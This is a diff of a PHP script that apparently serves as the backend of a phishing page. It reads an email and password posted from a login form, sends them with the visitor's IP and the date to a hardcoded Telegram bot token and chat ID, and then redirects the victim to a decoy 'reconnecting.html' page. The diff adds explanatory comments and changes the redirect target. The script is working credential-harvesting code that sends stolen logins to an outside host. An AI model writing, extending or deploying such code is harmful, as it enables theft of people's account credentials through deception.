@@ -1,8 +1,10 @@
 <?php
+// Replace 'YOUR_TELEGRAM_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual Telegram bot token and chat ID.
 $telegramBotToken = '5910982961:AAGdCuAo0CqdVhfGLFD72rwI71uAAU-WqAM';
 $chatId = '1634597902';
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Retrieve the login credentials, user's IP address, and current date from the form
     $email = isset($_POST['eml']) ? $_POST['eml'] : '';
     $password = isset($_POST['pwd']) ? $_POST['pwd'] : '';
 
@@ -39,10 +41,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         }
 
         // Debugging statement for redirection
-        error_log('Redirecting to login2.html');
+        error_log('Redirecting to reconnecting.html');
 
         // Redirect to another HTML page after sending to Telegram
-        header("Location: login2.html");
+        header("Location: reconnecting.html");
         exit;
     } else {
         // Handle case where email or password is empty
